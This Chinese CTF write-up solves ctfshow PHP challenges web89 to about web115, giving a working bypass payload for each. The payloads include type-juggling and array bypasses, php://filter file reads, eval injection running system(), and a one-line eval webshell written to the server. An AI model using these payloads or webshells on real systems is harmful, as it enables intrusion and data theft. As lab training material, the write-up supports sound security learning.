PHP是一门让人爱恨交加的语言，其中的一些奇奇怪怪的特性让开发者头疼，也给了安全从业者各种奇怪的入侵姿势，现在PHP8发布，安全人员难办了，但现在还是要了解，毕竟用PHP8之前开发的网站仍然是极多的，



## wp

### web89

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 15:38:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

对0-9进行过滤，又要是数字，使用数组绕过

```
url/?num[]=1
```

### web90

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:06:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

php弱类型，===需要判断值和类型都相等，==只用判断值

intval()获取变量的整数值

用url/?num=4476a即可绕过

### web91

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:16:09
# @link: https://ctfer.com

*/

show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

涉及到了Apache HTTPD 换行解析漏洞(CVE-2017-15715)

用一个%0a就可以绕过，（换行符）

/im更改 ^ 和 $ 的含义，以使它们分别与任何行的开头和结尾匹配,而不只是与整个字符串的开头和结尾匹配

正则表达式中$的意思

匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。

所以如果设置RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符（也就是%0a

```none
/?cmd=abc%0aphp
```

这样preg_match(‘/^php$/im’, $a)就会因为换行匹配到，而(preg_match(‘/^php$/i’, $a))没有/im，则匹配不到php，得到flag

### web92

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:29:30
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

对intval()和==的考察，==要求值相等，intval会将传入参数转化为十进制数字，所以传入十六进制4476即可绕过

```none
/?num=0x117C
```

### web93

```php
/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:32:58
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

过滤了字母，所以不能用16进制了，但可以使用别的进制，二进制以0b开头，八进制以0开头，十六进制以0x开头，所有这里使用8进制即可绕过

```none
/?num=010574	#4476的八进制格式
```

### web94

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:46:19
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

strpos()，查询0在$num中出现的第一次的位置，这样把010574也过滤了，可以看到这里使用的是===，即要求值和格式都一样，最后会使用intval转换为整数，所以使用4476.0就好了

```none
/?num=4476.0
```

### web95

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:53:59
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

将第一个if中的===换成了==，这样就不可以使用4476.0了。这里查阅可知，intval只对整数部分做转化，所以家上其他的字符不会对齐转换整数有影响，所以在八进制的4476前加上字符就可以绕过

，比如 使用url编码%0a，%0b，+，%2b等都可以

### web96

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:21:24
# @link: https://ctfer.com

*/


highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }


}
```

文件包含，不能直接?u=flag.php,因为随意输入一个字符串看到报错可以知道是linux服务器，所以包含当前文件夹下的文件，使用./flag.php,

```none
/?u=./flag.php
```

因为使用了文件包含且没有进行过滤，所以可以使用文件包含

```none
/?u=php://filter/read=convert.base64-encode/resource=flag.php
```

### web97

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:36:32
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?>
```

a,b不相同但md5相同，想到了md5碰撞，在网上搜一下找到了这样的字符串

```none
a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab
```

post可以得到flag

![img](https://howahh.github.io/images/image-20210517155128728.png)

看了一下hint，可以通过数组绕过，如果传入md5函数的参数为数组类型，则返回null，`null===null`，因此可以通过数组可以绕过 `===` md5判断

```none
a[]=1&b[]=2
```

对数组绕过做一个记录，有很多时候都可以运用数组进行绕过

参考[php数组绕过](https://www.jianshu.com/p/8e3b9d056da6)

```none
md5(Array()) = null
sha1(Array()) = null    
ereg(pattern,Array()) = null
preg_match(pattern,Array()) = false
strcmp(Array(), "abc") = null
strpos(Array(),"abc") = null
strlen(Array()) = null
```

### web98

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 21:39:27
# @link: https://ctfer.com

*/

include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?>
```

考察三元运算符

(expr1) ? (expr2) : (expr3);

和C语言没什么差别。

```none
$_GET?$_GET=&$_POST:'flag';
表示如果GET传参，则用POST传参flag覆盖

$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
如果GET传参是flag字符串，则用cookie传参的flag覆盖
以下同理
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';

highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__); 
如果传参的HTTP_FLAG为flag字符串，则读取flag文件，最后highlight显示
```

所以要想hightlight_file需要get http_flag,但用get会被覆盖，所以用post传参http_flag=flag,get随便用一个就行

### web99

```php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?>
```

看起来没什么问题，但是in_array函数有漏洞

in_array — 检查数组中是否存在某个值，

该函数并未将第三个参数设置为 true 时，攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 7shell.php 。因为PHP在使用 **in_array()** 函数判断时，会将 **7shell.php** 强制转换成数字7

这样就通过file_put_contents构成一个任意文件上传漏洞，会在服务器新建一个7shell.php文件，向其中写入的值为content上传的字符串，写入一个一句话木马，则可以getshell，

```none
get:url/?n=1shell.php
post:content=<?php @eval($_POST['aaa']); ?>
```

传入成功后访问上传的1shell.php

url/1shell.php

通过post来执行命令：

```none
post:aaa=phpinfo();
```

可以看到phpinfo界面，说明成功，接下来执行命令即可：

![img](https://howahh.github.io/images/image-20210525161202774.png)

可以看到flag在flag36d.php中

![image-20210525161305619](https://howahh.github.io/images/image-20210525161305619.png)

![image-20210525161313634](https://howahh.github.io/images/image-20210525161313634.png)

### web100

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-21 22:10:28
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
```

flag在ctfshow类里

通过get3个参数，来获得类中的flag，，其中v0必须是ture，对is_numeric对传入的三个参数进行判断，**只要三个参数里有一个数字即可**，（感觉不是应该三个都是吗，后续看看），v2不能有`;`,v3必须有`;`,可以通过实例化一个类来读flag：

```none
?v1=1&v2=echo new ReflectionClass&v3=;
```

即可得到flag，也可以通过var_dump函数来输出变量相关信息

```none
?v1=1$v2=var_dump($ctfshow)&v3=;
```

可以得到flag

### web101

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-22 00:26:48
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}

?>
```

和上一题一样，

```none
?v1=1&v2=echo new ReflectionClass&v3=;
```

即可得到flag

### web102

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 20:59:43

*/


highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}


?>
```

和之前相似但不相同，v2是要写入的webshell，想通过将一句话木马转为16进制，再通过函数hex2bin转换回来写入文件上传，最后getshell，因为is_numeric可以识别16进制，但失败了，

![img](https://howahh.github.io/images/image-20210525185107887.png)

应该是因为php7中的is_numeric不支持16进制的识别了，只能换别的方法

真不会，看别人的wp，

```php
$a='<?=`cat *`;';
$b=base64_encode($a);  // PD89YGNhdCAqYDs=
$c=bin2hex($b);      //这里直接用去掉=的base64
输出   5044383959474e6864434171594473

带e的话会被认为是科学计数法，可以通过is_numeric检测。
大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容
```

这里<?=是php的短标签，是echo()的快捷用法，这样将输出的转换后的webshell以v2传入，v3进行文件包含，即可，但注意要在5044383959474e6864434171594473前加00因为substr会从第二个字符开始截取，

最后访问1.php即可

![img](https://howahh.github.io/images/image-20210525192643703.png)

### web103

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 21:03:24

*/


highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}

?>
```

只是增加了一个过滤，看是否str中有p,h,p因为进行base64编码后的字符串中有p和h，所以直接和上一题一样就行

### web104

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:27:20

*/


highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}



?>
```

不是很懂想干啥，直接传v1和v2相同的值就输出了flag

![img](https://howahh.github.io/images/image-20210525193901100.png)

### web105

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:34:07

*/

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?>
```

使用变量覆盖，关键是`$$key=$$value;`,假如$key=aaa,则$$key=$aaa($aaa也是一个变量)

foreach中当前单元的键名也会在每次循环中被赋给变量 `$key`。值会赋值给`$value`,

所以，如果url/?aaa=flag则$key=aaa,$value=flag，所以：$$key=$$value即$aaa=$flag

$flag=ctfshow{xxxxx}，?dotast=flag，通过第一个for循环，以及$$key=$$value也就是$dotast=$flag，$dotast=ctfshow{xxxxx}，接着再通过第二个for循环，$error=$dotast，此时$error=ctfshow{xxxxx}

所以最后可以得到payload：

```none
url/?suces=flag
post:error=suces
```

过程为$suces=$flag=ctfshow{xxxxx}

$error=$suces=ctfshow{xxxxx}最后通过die($error)输出flag

也可以通过die(suces)输出flag

```none
?suces=flag&flag=
```

### web106

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:38:27

*/


highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}



?>
```

sha1函数，通过数组绕过即可

```none
url/?v2[]=1
post:v1[]=2
```

![img](https://howahh.github.io/images/image-20210526220841213.png)

### web107

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 23:24:14

*/


highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }

}



?>
```

**parse_str — 将字符串解析成多个变量**

```php
$str = "first=value&arr[]=foo+bar&arr[]=baz";

// 推荐用法
parse_str($str, $output);
echo $output['first'];  // value
echo $output['arr'][0]; // foo bar
echo $output['arr'][1]; // baz
```

这里又出现了md5，想到的还是数组绕过，只要让post传入的flag为null即可，所以

```none
url/?v3[]=1
post:v1=flag
```

![img](https://howahh.github.io/images/image-20210526223058700.png)

最开始是想的给v3随便传一个数比如1，v1传入其md5的值即v3=flag=a0b923820dcc509a也可以得到flag

### web108

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 23:53:55

*/


highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
```

ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配(这个函数在php7已经被废弃了)

**strrev()** 函数反转字符串。

**intval()** 函数用于获取变量的整数值

所以payload:

```none
url/?c=aaa%00778
```

### web109

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-29 22:02:34

*/


highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

}

?>
```

本题用到了php的异常处理（Exception），通过eval中的$v1($v2())来执行命令

这里v1和v2都要有字母即可进入eval，执行我们想要的命令,用php内置类让v1不进行报错，v2执行我们的命令

```none
Exception 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类
ReflectionClass 或者 ReflectionMethod 都为常用的反射类，可以理解为一个类的映射
```

![img](https://howahh.github.io/images/image-20210527194742184.png)

![img](https://howahh.github.io/images/image-20210527194836031.png)

最后payload:

```none
/?v1=Exception&v2=system('tac fl36dg.txt')
```

Exception也可以用ReflectionClass 或者 ReflectionMethod替代

**用cat，more，less没有输出，但用tac或者tail就有，也不知道为什么，可能有过滤？**

### web110

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-29 22:49:10

*/


highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}

?>
```

和上一道类似，但是过滤了所有数字和特殊字符

php内置类 利用 FilesystemIterator 获取指定目录下的所有文件。这是一个文件系统迭代器

[FilesystemIterator](https://www.php.net/manual/zh/class.filesystemiterator.php)

通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构

getcwd():获取当前工作目录

FilesystemIterator(getcwd())

这样就可以看到当前目录下有什么文件

![img](https://howahh.github.io/images/image-20210527201042842.png)

再直接访问即可

### web111

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 02:41:40

*/

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
    

    


}

?>
```

首先学习一下php的取地址符&

php的引用就是在变量或者函数、对象等前面加上&符号。在PHP 中引用的意思是：不同的名字访问同一个变量内容。与C语言中的指针是有差别的，C语言中的指针里面存储的是变量的内容在内存中存放的地址。

```none
<? 
$a="ABC"; 
$b =&$a; 
echo $a;//这里输出:ABC 
echo $b;//这里输出:ABC 
$b="EFG"; 
echo $a;//这里$a的值变为EFG 所以输出EFG 
echo $b;//这里输出EFG
```

在这道题中，最终的目标是通过var_dump()输出变量的参数，` var_dump($$v1);`而$v1必须是ctfshow,这里还是用到了变量覆盖，通过`eval("$$v1 = &$$v2;");`实现

```none
$GLOBALS — 引用全局作用域中可用的全部变量，一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
$$v1=&$$v2
$ctfshow=&$GLOBLAS
这样就可以输出所有的变量，也就有flag了
payload:
/?v1=ctfshow&v2=GLOBALS
```

![img](https://howahh.github.io/images/image-20210527203916163.png)

### web112

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 23:47:49

*/

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

看到过滤的想到文件包含，没有过滤filter，那就用这个，过滤了base64，那就不要base64就行了

![img](https://howahh.github.io/images/image-20210114181853207.png)

```none
//?file=php://filter/read/resource=flag.php
测试了一下read后有没有参数不重要，也可以直接不要了，算是复习了一下文件包含
php://filter/resource=flag.php
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
compress.zlib://flag.php
```

![img](https://howahh.github.io/images/image-20210527204609650.png)

### web113

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 23:47:52

*/

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 
```

过滤了filter,那用compress.zlib即可

```none
payload:
url/?file=compress.zlib://flag.php
```

### web114

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 15:02:53

*/

error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

不是很懂在干什么，把compress过滤了但filter又放出来了，那就直接

```none
php://filter/resource=flag.php
```

就行了

### web105

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 15:08:19

*/

include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
}
```

filter函数让想用十六进制和8进制绕过不现实，trim函数是字符去除字符串首尾处的空白字符（或者其他字符），这里看wp，是用脚本判断是否有可用的字符可以绕过：

```php
<?php
for ($i = 0; $i <= 128; $i++) {
    $a = chr($i) . '36';
    if (trim($a) !== '36' && is_numeric($a)) {
        echo urlencode(chr($i)) . "\n";
    }
}
```

发现`\f`，也即分页符可用，也就是`%0c`用这个进行阶段就行了

```none
payload:
url/?num=%0c36
```

### web123

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
